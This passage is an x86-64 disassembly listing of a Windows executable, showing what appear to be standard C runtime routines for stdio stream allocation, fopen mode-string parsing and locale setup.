   14000492b:	45 8b c1             	mov    %r9d,%r8d
   14000492e:	4d 03 c0             	add    %r8,%r8
   140004931:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   140004936:	48 3b f0             	cmp    %rax,%rsi
   140004939:	72 20                	jb     0x14000495b
   14000493b:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   140004940:	48 3b f0             	cmp    %rax,%rsi
   140004943:	73 16                	jae    0x14000495b
   140004945:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   140004949:	42 39 44 c3 10       	cmp    %eax,0x10(%rbx,%r8,8)
   14000494e:	75 0b                	jne    0x14000495b
   140004950:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140004954:	42 39 44 c3 0c       	cmp    %eax,0xc(%rbx,%r8,8)
   140004959:	74 08                	je     0x140004963
   14000495b:	41 ff c1             	inc    %r9d
   14000495e:	44 3b ca             	cmp    %edx,%r9d
   140004961:	72 c8                	jb     0x14000492b
   140004963:	44 3b ca             	cmp    %edx,%r9d
   140004966:	75 32                	jne    0x14000499a
   140004968:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   14000496c:	85 c0                	test   %eax,%eax
   14000496e:	74 07                	je     0x140004977
   140004970:	48 3b f0             	cmp    %rax,%rsi
   140004973:	74 25                	je     0x14000499a
   140004975:	eb 17                	jmp    0x14000498e
   140004977:	8d 47 01             	lea    0x1(%rdi),%eax
   14000497a:	49 8b d5             	mov    %r13,%rdx
   14000497d:	41 89 46 48          	mov    %eax,0x48(%r14)
   140004981:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140004986:	b1 01                	mov    $0x1,%cl
   140004988:	4d 03 c4             	add    %r12,%r8
   14000498b:	41 ff d0             	call   *%r8
   14000498e:	ff c7                	inc    %edi
   140004990:	8b 13                	mov    (%rbx),%edx
   140004992:	3b fa                	cmp    %edx,%edi
   140004994:	0f 82 6d ff ff ff    	jb     0x140004907
   14000499a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000499f:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400049a4:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400049a8:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400049ac:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400049b0:	49 8b e3             	mov    %r11,%rsp
   1400049b3:	41 5f                	pop    %r15
   1400049b5:	41 5e                	pop    %r14
   1400049b7:	41 5d                	pop    %r13
   1400049b9:	41 5c                	pop    %r12
   1400049bb:	5f                   	pop    %rdi
   1400049bc:	c3                   	ret
   1400049bd:	cc                   	int3
   1400049be:	cc                   	int3
   1400049bf:	cc                   	int3
   1400049c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400049c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400049ca:	57                   	push   %rdi
   1400049cb:	48 83 ec 30          	sub    $0x30,%rsp
   1400049cf:	33 db                	xor    %ebx,%ebx
   1400049d1:	8d 4b 01             	lea    0x1(%rbx),%ecx
   1400049d4:	e8 d7 34 00 00       	call   0x140007eb0
   1400049d9:	90                   	nop
   1400049da:	33 ff                	xor    %edi,%edi
   1400049dc:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1400049e0:	3b 3d 92 72 01 00    	cmp    0x17292(%rip),%edi        # 0x14001bc78
   1400049e6:	0f 8d ca 00 00 00    	jge    0x140004ab6
   1400049ec:	48 63 f7             	movslq %edi,%rsi
   1400049ef:	48 8b 05 7a 72 01 00 	mov    0x1727a(%rip),%rax        # 0x14001bc70
   1400049f6:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   1400049fa:	48 85 c9             	test   %rcx,%rcx
   1400049fd:	74 62                	je     0x140004a61
   1400049ff:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   140004a03:	75 55                	jne    0x140004a5a
   140004a05:	f7 41 18 00 80 00 00 	testl  $0x8000,0x18(%rcx)
   140004a0c:	75 4c                	jne    0x140004a5a
   140004a0e:	8d 47 fd             	lea    -0x3(%rdi),%eax
   140004a11:	83 f8 10             	cmp    $0x10,%eax
   140004a14:	77 10                	ja     0x140004a26
   140004a16:	8d 4f 10             	lea    0x10(%rdi),%ecx
   140004a19:	e8 5e 35 00 00       	call   0x140007f7c
   140004a1e:	85 c0                	test   %eax,%eax
   140004a20:	0f 84 90 00 00 00    	je     0x140004ab6
   140004a26:	48 8b 15 43 72 01 00 	mov    0x17243(%rip),%rdx        # 0x14001bc70
   140004a2d:	48 8b 14 f2          	mov    (%rdx,%rsi,8),%rdx
   140004a31:	8b cf                	mov    %edi,%ecx
   140004a33:	e8 ac f8 ff ff       	call   0x1400042e4
   140004a38:	48 8b 05 31 72 01 00 	mov    0x17231(%rip),%rax        # 0x14001bc70
   140004a3f:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   140004a43:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   140004a47:	74 0c                	je     0x140004a55
   140004a49:	48 8b d1             	mov    %rcx,%rdx
   140004a4c:	8b cf                	mov    %edi,%ecx
   140004a4e:	e8 15 f9 ff ff       	call   0x140004368
   140004a53:	eb 05                	jmp    0x140004a5a
   140004a55:	48 8b d9             	mov    %rcx,%rbx
   140004a58:	eb 5c                	jmp    0x140004ab6
   140004a5a:	ff c7                	inc    %edi
   140004a5c:	e9 7b ff ff ff       	jmp    0x1400049dc
   140004a61:	b9 58 00 00 00       	mov    $0x58,%ecx
   140004a66:	e8 c9 28 00 00       	call   0x140007334
   140004a6b:	48 8b c8             	mov    %rax,%rcx
   140004a6e:	48 63 ff             	movslq %edi,%rdi
   140004a71:	48 8b 05 f8 71 01 00 	mov    0x171f8(%rip),%rax        # 0x14001bc70
   140004a78:	48 89 0c f8          	mov    %rcx,(%rax,%rdi,8)
   140004a7c:	48 85 c9             	test   %rcx,%rcx
   140004a7f:	74 35                	je     0x140004ab6
   140004a81:	48 83 c1 30          	add    $0x30,%rcx
   140004a85:	45 33 c0             	xor    %r8d,%r8d
   140004a88:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140004a8d:	e8 ca ee ff ff       	call   0x14000395c
   140004a92:	48 8b 05 d7 71 01 00 	mov    0x171d7(%rip),%rax        # 0x14001bc70
   140004a99:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   140004a9d:	48 83 c1 30          	add    $0x30,%rcx
   140004aa1:	ff 15 a1 c6 00 00    	call   *0xc6a1(%rip)        # 0x140011148
   140004aa7:	48 8b 05 c2 71 01 00 	mov    0x171c2(%rip),%rax        # 0x14001bc70
   140004aae:	48 8b 1c f8          	mov    (%rax,%rdi,8),%rbx
   140004ab2:	83 63 18 00          	andl   $0x0,0x18(%rbx)
   140004ab6:	48 85 db             	test   %rbx,%rbx
   140004ab9:	74 1d                	je     0x140004ad8
   140004abb:	81 63 18 00 80 00 00 	andl   $0x8000,0x18(%rbx)
   140004ac2:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   140004ac6:	48 83 63 10 00       	andq   $0x0,0x10(%rbx)
   140004acb:	48 83 23 00          	andq   $0x0,(%rbx)
   140004acf:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   140004ad4:	83 4b 1c ff          	orl    $0xffffffff,0x1c(%rbx)
   140004ad8:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004add:	e8 be 35 00 00       	call   0x1400080a0
   140004ae2:	48 8b c3             	mov    %rbx,%rax
   140004ae5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004aea:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004aef:	48 83 c4 30          	add    $0x30,%rsp
   140004af3:	5f                   	pop    %rdi
   140004af4:	c3                   	ret
   140004af5:	cc                   	int3
   140004af6:	cc                   	int3
   140004af7:	cc                   	int3
   140004af8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004afd:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140004b02:	56                   	push   %rsi
   140004b03:	57                   	push   %rdi
   140004b04:	41 55                	push   %r13
   140004b06:	41 56                	push   %r14
   140004b08:	41 57                	push   %r15
   140004b0a:	48 83 ec 30          	sub    $0x30,%rsp
   140004b0e:	8b 35 fc 6f 01 00    	mov    0x16ffc(%rip),%esi        # 0x14001bb10
   140004b14:	4d 8b f1             	mov    %r9,%r14
   140004b17:	45 33 c9             	xor    %r9d,%r9d
   140004b1a:	45 33 d2             	xor    %r10d,%r10d
   140004b1d:	45 33 db             	xor    %r11d,%r11d
   140004b20:	80 3a 20             	cmpb   $0x20,(%rdx)
   140004b23:	45 8d 69 01          	lea    0x1(%r9),%r13d
   140004b27:	41 8b e8             	mov    %r8d,%ebp
   140004b2a:	48 8b da             	mov    %rdx,%rbx
   140004b2d:	4c 8b f9             	mov    %rcx,%r15
   140004b30:	75 08                	jne    0x140004b3a
   140004b32:	49 03 dd             	add    %r13,%rbx
   140004b35:	80 3b 20             	cmpb   $0x20,(%rbx)
   140004b38:	74 f8                	je     0x140004b32
   140004b3a:	80 3b 61             	cmpb   $0x61,(%rbx)
   140004b3d:	74 2f                	je     0x140004b6e
   140004b3f:	80 3b 72             	cmpb   $0x72,(%rbx)
   140004b42:	74 23                	je     0x140004b67
   140004b44:	80 3b 77             	cmpb   $0x77,(%rbx)
   140004b47:	74 17                	je     0x140004b60
   140004b49:	e8 2a fa ff ff       	call   0x140004578
   140004b4e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004b54:	e8 cf f5 ff ff       	call   0x140004128
   140004b59:	33 c0                	xor    %eax,%eax
   140004b5b:	e9 3a 02 00 00       	jmp    0x140004d9a
   140004b60:	bf 01 03 00 00       	mov    $0x301,%edi
   140004b65:	eb 0c                	jmp    0x140004b73
   140004b67:	33 ff                	xor    %edi,%edi
   140004b69:	41 0b f5             	or     %r13d,%esi
   140004b6c:	eb 08                	jmp    0x140004b76
   140004b6e:	bf 09 01 00 00       	mov    $0x109,%edi
   140004b73:	83 ce 02             	or     $0x2,%esi
   140004b76:	49 03 dd             	add    %r13,%rbx
   140004b79:	41 8b d5             	mov    %r13d,%edx
   140004b7c:	8a 03                	mov    (%rbx),%al
   140004b7e:	84 c0                	test   %al,%al
   140004b80:	0f 84 bb 01 00 00    	je     0x140004d41
   140004b86:	41 b8 00 40 00 00    	mov    $0x4000,%r8d
   140004b8c:	85 d2                	test   %edx,%edx
   140004b8e:	0f 84 ee 00 00 00    	je     0x140004c82
   140004b94:	0f be c8             	movsbl %al,%ecx
   140004b97:	83 f9 53             	cmp    $0x53,%ecx
   140004b9a:	7f 79                	jg     0x140004c15
   140004b9c:	74 6a                	je     0x140004c08
   140004b9e:	83 e9 20             	sub    $0x20,%ecx
   140004ba1:	0f 84 ce 00 00 00    	je     0x140004c75
   140004ba7:	83 e9 0b             	sub    $0xb,%ecx
   140004baa:	74 47                	je     0x140004bf3
   140004bac:	ff c9                	dec    %ecx
   140004bae:	74 3e                	je     0x140004bee
   140004bb0:	83 e9 18             	sub    $0x18,%ecx
   140004bb3:	74 27                	je     0x140004bdc
   140004bb5:	83 e9 0a             	sub    $0xa,%ecx
   140004bb8:	74 19                	je     0x140004bd3
   140004bba:	83 f9 04             	cmp    $0x4,%ecx
   140004bbd:	75 8a                	jne    0x140004b49
   140004bbf:	45 85 d2             	test   %r10d,%r10d
   140004bc2:	0f 85 a5 00 00 00    	jne    0x140004c6d
   140004bc8:	45 8b d5             	mov    %r13d,%r10d
   140004bcb:	83 cf 10             	or     $0x10,%edi
   140004bce:	e9 a2 00 00 00       	jmp    0x140004c75
   140004bd3:	0f ba ef 07          	bts    $0x7,%edi
   140004bd7:	e9 99 00 00 00       	jmp    0x140004c75
   140004bdc:	40 f6 c7 40          	test   $0x40,%dil
   140004be0:	0f 85 87 00 00 00    	jne    0x140004c6d
   140004be6:	83 cf 40             	or     $0x40,%edi
   140004be9:	e9 87 00 00 00       	jmp    0x140004c75
   140004bee:	45 8b dd             	mov    %r13d,%r11d
   140004bf1:	eb 7a                	jmp    0x140004c6d
   140004bf3:	40 f6 c7 02          	test   $0x2,%dil
   140004bf7:	75 74                	jne    0x140004c6d
   140004bf9:	83 e7 fe             	and    $0xfffffffe,%edi
   140004bfc:	83 e6 fc             	and    $0xfffffffc,%esi
   140004bff:	83 cf 02             	or     $0x2,%edi
   140004c02:	0f ba ee 07          	bts    $0x7,%esi
   140004c06:	eb 6d                	jmp    0x140004c75
   140004c08:	45 85 d2             	test   %r10d,%r10d
   140004c0b:	75 60                	jne    0x140004c6d
   140004c0d:	45 8b d5             	mov    %r13d,%r10d
   140004c10:	83 cf 20             	or     $0x20,%edi
   140004c13:	eb 60                	jmp    0x140004c75
   140004c15:	83 e9 54             	sub    $0x54,%ecx
   140004c18:	74 4d                	je     0x140004c67
   140004c1a:	83 e9 0e             	sub    $0xe,%ecx
   140004c1d:	74 3a                	je     0x140004c59
   140004c1f:	ff c9                	dec    %ecx
   140004c21:	74 29                	je     0x140004c4c
   140004c23:	83 e9 0b             	sub    $0xb,%ecx
   140004c26:	74 16                	je     0x140004c3e
   140004c28:	83 f9 06             	cmp    $0x6,%ecx
   140004c2b:	0f 85 18 ff ff ff    	jne    0x140004b49
   140004c31:	f7 c7 00 c0 00 00    	test   $0xc000,%edi
   140004c37:	75 34                	jne    0x140004c6d
   140004c39:	41 0b f8             	or     %r8d,%edi
   140004c3c:	eb 37                	jmp    0x140004c75
   140004c3e:	45 85 c9             	test   %r9d,%r9d
   140004c41:	75 2a                	jne    0x140004c6d
   140004c43:	45 8b cd             	mov    %r13d,%r9d
   140004c46:	0f ba f6 0e          	btr    $0xe,%esi
   140004c4a:	eb 29                	jmp    0x140004c75
   140004c4c:	45 85 c9             	test   %r9d,%r9d
   140004c4f:	75 1c                	jne    0x140004c6d
   140004c51:	45 8b cd             	mov    %r13d,%r9d
   140004c54:	41 0b f0             	or     %r8d,%esi
   140004c57:	eb 1c                	jmp    0x140004c75
   140004c59:	f7 c7 00 c0 00 00    	test   $0xc000,%edi
   140004c5f:	75 0c                	jne    0x140004c6d
   140004c61:	0f ba ef 0f          	bts    $0xf,%edi
   140004c65:	eb 0e                	jmp    0x140004c75
   140004c67:	0f ba e7 0c          	bt     $0xc,%edi
   140004c6b:	73 04                	jae    0x140004c71
   140004c6d:	33 d2                	xor    %edx,%edx
   140004c6f:	eb 04                	jmp    0x140004c75
   140004c71:	0f ba ef 0c          	bts    $0xc,%edi
   140004c75:	49 03 dd             	add    %r13,%rbx
   140004c78:	8a 03                	mov    (%rbx),%al
   140004c7a:	84 c0                	test   %al,%al
   140004c7c:	0f 85 0a ff ff ff    	jne    0x140004b8c
   140004c82:	45 85 db             	test   %r11d,%r11d
   140004c85:	0f 84 b6 00 00 00    	je     0x140004d41
   140004c8b:	eb 03                	jmp    0x140004c90
   140004c8d:	49 03 dd             	add    %r13,%rbx
   140004c90:	80 3b 20             	cmpb   $0x20,(%rbx)
   140004c93:	74 f8                	je     0x140004c8d
   140004c95:	48 8d 0d cc cc 00 00 	lea    0xcccc(%rip),%rcx        # 0x140011968
   140004c9c:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004ca2:	48 8b d3             	mov    %rbx,%rdx
   140004ca5:	e8 72 3d 00 00       	call   0x140008a1c
   140004caa:	85 c0                	test   %eax,%eax
   140004cac:	0f 85 97 fe ff ff    	jne    0x140004b49
   140004cb2:	48 83 c3 03          	add    $0x3,%rbx
   140004cb6:	eb 03                	jmp    0x140004cbb
   140004cb8:	49 03 dd             	add    %r13,%rbx
   140004cbb:	80 3b 20             	cmpb   $0x20,(%rbx)
   140004cbe:	74 f8                	je     0x140004cb8
   140004cc0:	80 3b 3d             	cmpb   $0x3d,(%rbx)
   140004cc3:	0f 85 80 fe ff ff    	jne    0x140004b49
   140004cc9:	49 03 dd             	add    %r13,%rbx
   140004ccc:	80 3b 20             	cmpb   $0x20,(%rbx)
   140004ccf:	74 f8                	je     0x140004cc9
   140004cd1:	48 8d 15 94 cc 00 00 	lea    0xcc94(%rip),%rdx        # 0x14001196c
   140004cd8:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140004cde:	48 8b cb             	mov    %rbx,%rcx
   140004ce1:	e8 6a 3e 00 00       	call   0x140008b50
   140004ce6:	85 c0                	test   %eax,%eax
   140004ce8:	75 0a                	jne    0x140004cf4
   140004cea:	48 83 c3 05          	add    $0x5,%rbx
   140004cee:	0f ba ef 12          	bts    $0x12,%edi
   140004cf2:	eb 4d                	jmp    0x140004d41
   140004cf4:	48 8d 15 7d cc 00 00 	lea    0xcc7d(%rip),%rdx        # 0x140011978
   140004cfb:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004d01:	48 8b cb             	mov    %rbx,%rcx
   140004d04:	e8 47 3e 00 00       	call   0x140008b50
   140004d09:	85 c0                	test   %eax,%eax
   140004d0b:	75 0a                	jne    0x140004d17
   140004d0d:	48 83 c3 08          	add    $0x8,%rbx
   140004d11:	0f ba ef 11          	bts    $0x11,%edi
   140004d15:	eb 2a                	jmp    0x140004d41
   140004d17:	48 8d 15 6a cc 00 00 	lea    0xcc6a(%rip),%rdx        # 0x140011988
   140004d1e:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140004d24:	48 8b cb             	mov    %rbx,%rcx
   140004d27:	e8 24 3e 00 00       	call   0x140008b50
   140004d2c:	85 c0                	test   %eax,%eax
   140004d2e:	0f 85 15 fe ff ff    	jne    0x140004b49
   140004d34:	48 83 c3 07          	add    $0x7,%rbx
   140004d38:	0f ba ef 10          	bts    $0x10,%edi
   140004d3c:	eb 03                	jmp    0x140004d41
   140004d3e:	49 03 dd             	add    %r13,%rbx
   140004d41:	80 3b 20             	cmpb   $0x20,(%rbx)
   140004d44:	74 f8                	je     0x140004d3e
   140004d46:	80 3b 00             	cmpb   $0x0,(%rbx)
   140004d49:	0f 85 fa fd ff ff    	jne    0x140004b49
   140004d4f:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140004d54:	44 8b cd             	mov    %ebp,%r9d
   140004d57:	44 8b c7             	mov    %edi,%r8d
   140004d5a:	49 8b d7             	mov    %r15,%rdx
   140004d5d:	c7 44 24 20 80 01 00 	movl   $0x180,0x20(%rsp)
   140004d64:	00 
   140004d65:	e8 7e 3c 00 00       	call   0x1400089e8
   140004d6a:	85 c0                	test   %eax,%eax
   140004d6c:	0f 85 e7 fd ff ff    	jne    0x140004b59
   140004d72:	44 01 2d 7f 61 01 00 	add    %r13d,0x1617f(%rip)        # 0x14001aef8
   140004d79:	41 21 46 08          	and    %eax,0x8(%r14)
   140004d7d:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140004d81:	49 83 26 00          	andq   $0x0,(%r14)
   140004d85:	49 83 66 10 00       	andq   $0x0,0x10(%r14)
   140004d8a:	49 83 66 28 00       	andq   $0x0,0x28(%r14)
   140004d8f:	41 89 46 1c          	mov    %eax,0x1c(%r14)
   140004d93:	41 89 76 18          	mov    %esi,0x18(%r14)
   140004d97:	49 8b c6             	mov    %r14,%rax
   140004d9a:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004d9f:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   140004da4:	48 83 c4 30          	add    $0x30,%rsp
   140004da8:	41 5f                	pop    %r15
   140004daa:	41 5e                	pop    %r14
   140004dac:	41 5d                	pop    %r13
   140004dae:	5f                   	pop    %rdi
   140004daf:	5e                   	pop    %rsi
   140004db0:	c3                   	ret
   140004db1:	cc                   	int3
   140004db2:	cc                   	int3
   140004db3:	cc                   	int3
   140004db4:	cc                   	int3
   140004db5:	cc                   	int3
   140004db6:	cc                   	int3
   140004db7:	cc                   	int3
   140004db8:	cc                   	int3
   140004db9:	cc                   	int3
   140004dba:	cc                   	int3
   140004dbb:	cc                   	int3
   140004dbc:	cc                   	int3
   140004dbd:	cc                   	int3
   140004dbe:	cc                   	int3
   140004dbf:	cc                   	int3
   140004dc0:	cc                   	int3
   140004dc1:	cc                   	int3
   140004dc2:	cc                   	int3
   140004dc3:	cc                   	int3
   140004dc4:	cc                   	int3
   140004dc5:	cc                   	int3
   140004dc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004dcd:	00 00 00 
   140004dd0:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   140004dd7:	4d 33 c0             	xor    %r8,%r8
   140004dda:	4d 33 c9             	xor    %r9,%r9
   140004ddd:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   140004de2:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140004de7:	e8 e6 b6 00 00       	call   0x1400104d2
   140004dec:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   140004df3:	c3                   	ret
   140004df4:	cc                   	int3
   140004df5:	cc                   	int3
   140004df6:	cc                   	int3
   140004df7:	cc                   	int3
   140004df8:	cc                   	int3
   140004df9:	cc                   	int3
   140004dfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004e00:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004e05:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140004e0a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140004e0f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140004e16:	eb 08                	jmp    0x140004e20
   140004e18:	cc                   	int3
   140004e19:	cc                   	int3
   140004e1a:	cc                   	int3
   140004e1b:	cc                   	int3
   140004e1c:	cc                   	int3
   140004e1d:	cc                   	int3
   140004e1e:	66 90                	xchg   %ax,%ax
   140004e20:	c3                   	ret
   140004e21:	cc                   	int3
   140004e22:	cc                   	int3
   140004e23:	cc                   	int3
   140004e24:	cc                   	int3
   140004e25:	cc                   	int3
   140004e26:	cc                   	int3
   140004e27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004e2e:	00 00 
   140004e30:	c3                   	ret
   140004e31:	cc                   	int3
   140004e32:	cc                   	int3
   140004e33:	cc                   	int3
   140004e34:	85 c9                	test   %ecx,%ecx
   140004e36:	74 32                	je     0x140004e6a
   140004e38:	53                   	push   %rbx
   140004e39:	48 83 ec 20          	sub    $0x20,%rsp
   140004e3d:	f7 42 18 00 10 00 00 	testl  $0x1000,0x18(%rdx)
   140004e44:	48 8b da             	mov    %rdx,%rbx
   140004e47:	74 1c                	je     0x140004e65
   140004e49:	48 8b ca             	mov    %rdx,%rcx
   140004e4c:	e8 1b f8 ff ff       	call   0x14000466c
   140004e51:	81 63 18 ff ee ff ff 	andl   $0xffffeeff,0x18(%rbx)
   140004e58:	83 63 24 00          	andl   $0x0,0x24(%rbx)
   140004e5c:	48 83 23 00          	andq   $0x0,(%rbx)
   140004e60:	48 83 63 10 00       	andq   $0x0,0x10(%rbx)
   140004e65:	48 83 c4 20          	add    $0x20,%rsp
   140004e69:	5b                   	pop    %rbx
   140004e6a:	c3                   	ret
   140004e6b:	cc                   	int3
   140004e6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e71:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140004e76:	41 56                	push   %r14
   140004e78:	48 83 ec 20          	sub    $0x20,%rsp
   140004e7c:	48 8b d9             	mov    %rcx,%rbx
   140004e7f:	e8 00 f3 ff ff       	call   0x140004184
   140004e84:	8b c8                	mov    %eax,%ecx
   140004e86:	e8 7d 3e 00 00       	call   0x140008d08
   140004e8b:	85 c0                	test   %eax,%eax
   140004e8d:	0f 84 95 00 00 00    	je     0x140004f28
   140004e93:	e8 dc f3 ff ff       	call   0x140004274
   140004e98:	48 83 c0 30          	add    $0x30,%rax
   140004e9c:	48 3b d8             	cmp    %rax,%rbx
   140004e9f:	75 04                	jne    0x140004ea5
   140004ea1:	33 c0                	xor    %eax,%eax
   140004ea3:	eb 13                	jmp    0x140004eb8
   140004ea5:	e8 ca f3 ff ff       	call   0x140004274
   140004eaa:	48 83 c0 60          	add    $0x60,%rax
   140004eae:	48 3b d8             	cmp    %rax,%rbx
   140004eb1:	75 75                	jne    0x140004f28
   140004eb3:	b8 01 00 00 00       	mov    $0x1,%eax
   140004eb8:	ff 05 3a 60 01 00    	incl   0x1603a(%rip)        # 0x14001aef8
   140004ebe:	f7 43 18 0c 01 00 00 	testl  $0x10c,0x18(%rbx)
   140004ec5:	75 61                	jne    0x140004f28
   140004ec7:	4c 8d 35 32 60 01 00 	lea    0x16032(%rip),%r14        # 0x14001af00
   140004ece:	48 63 f8             	movslq %eax,%rdi
   140004ed1:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   140004ed5:	48 85 c0             	test   %rax,%rax
   140004ed8:	75 2b                	jne    0x140004f05
   140004eda:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140004edf:	e8 50 24 00 00       	call   0x140007334
   140004ee4:	49 89 04 fe          	mov    %rax,(%r14,%rdi,8)
   140004ee8:	48 85 c0             	test   %rax,%rax
   140004eeb:	75 18                	jne    0x140004f05
   140004eed:	48 8d 43 20          	lea    0x20(%rbx),%rax
   140004ef1:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004ef5:	48 89 03             	mov    %rax,(%rbx)
   140004ef8:	b8 02 00 00 00       	mov    $0x2,%eax
   140004efd:	89 43 24             	mov    %eax,0x24(%rbx)
   140004f00:	89 43 08             	mov    %eax,0x8(%rbx)
   140004f03:	eb 15                	jmp    0x140004f1a
   140004f05:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004f09:	48 89 03             	mov    %rax,(%rbx)
   140004f0c:	c7 43 24 00 10 00 00 	movl   $0x1000,0x24(%rbx)
   140004f13:	c7 43 08 00 10 00 00 	movl   $0x1000,0x8(%rbx)
   140004f1a:	81 4b 18 02 11 00 00 	orl    $0x1102,0x18(%rbx)
   140004f21:	b8 01 00 00 00       	mov    $0x1,%eax
   140004f26:	eb 02                	jmp    0x140004f2a
   140004f28:	33 c0                	xor    %eax,%eax
   140004f2a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f2f:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140004f34:	48 83 c4 20          	add    $0x20,%rsp
   140004f38:	41 5e                	pop    %r14
   140004f3a:	c3                   	ret
   140004f3b:	cc                   	int3
   140004f3c:	40 53                	rex push %rbx
   140004f3e:	48 83 ec 20          	sub    $0x20,%rsp
   140004f42:	48 8b d9             	mov    %rcx,%rbx
   140004f45:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140004f49:	48 85 d2             	test   %rdx,%rdx
   140004f4c:	0f 85 82 00 00 00    	jne    0x140004fd4
   140004f52:	e8 61 1c 00 00       	call   0x140006bb8
   140004f57:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004f5b:	48 8b 90 c0 00 00 00 	mov    0xc0(%rax),%rdx
   140004f62:	48 89 13             	mov    %rdx,(%rbx)
   140004f65:	48 8b 88 b8 00 00 00 	mov    0xb8(%rax),%rcx
   140004f6c:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140004f70:	48 3b 15 89 50 01 00 	cmp    0x15089(%rip),%rdx        # 0x14001a000
   140004f77:	74 16                	je     0x140004f8f
   140004f79:	8b 80 c8 00 00 00    	mov    0xc8(%rax),%eax
   140004f7f:	85 05 e3 51 01 00    	test   %eax,0x151e3(%rip)        # 0x14001a168
   140004f85:	75 08                	jne    0x140004f8f
   140004f87:	e8 a4 40 00 00       	call   0x140009030
   140004f8c:	48 89 03             	mov    %rax,(%rbx)
   140004f8f:	48 8b 05 9a 4d 01 00 	mov    0x14d9a(%rip),%rax        # 0x140019d30
   140004f96:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   140004f9a:	74 1b                	je     0x140004fb7
   140004f9c:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004fa0:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   140004fa6:	85 0d bc 51 01 00    	test   %ecx,0x151bc(%rip)        # 0x14001a168
   140004fac:	75 09                	jne    0x140004fb7
   140004fae:	e8 75 44 00 00       	call   0x140009428
   140004fb3:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004fb7:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140004fbb:	8b 81 c8 00 00 00    	mov    0xc8(%rcx),%eax
   140004fc1:	a8 02                	test   $0x2,%al
   140004fc3:	75 16                	jne    0x140004fdb
   140004fc5:	83 c8 02             	or     $0x2,%eax
   140004fc8:	89 81 c8 00 00 00    	mov    %eax,0xc8(%rcx)
   140004fce:	c6 43 18 01          	movb   $0x1,0x18(%rbx)
   140004fd2:	eb 07                	jmp    0x140004fdb
   140004fd4:	0f 10 02             	movups (%rdx),%xmm0
   140004fd7:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   140004fdb:	48 8b c3             	mov    %rbx,%rax
   140004fde:	48 83 c4 20          	add    $0x20,%rsp
   140004fe2:	5b                   	pop    %rbx
   140004fe3:	c3                   	ret
   140004fe4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004fe9:	55                   	push   %rbp
   140004fea:	56                   	push   %rsi
   140004feb:	57                   	push   %rdi
   140004fec:	41 54                	push   %r12
   140004fee:	41 55                	push   %r13
   140004ff0:	41 56                	push   %r14
   140004ff2:	41 57                	push   %r15
   140004ff4:	48 8d ac 24 20 fe ff 	lea    -0x1e0(%rsp),%rbp
   140004ffb:	ff 
   140004ffc:	48 81 ec e0 02 00 00 	sub    $0x2e0,%rsp
   140005003:	48 8b 05 f6 3f 01 00 	mov    0x13ff6(%rip),%rax        # 0x140019000
   14000500a:	48 33 c4             	xor    %rsp,%rax
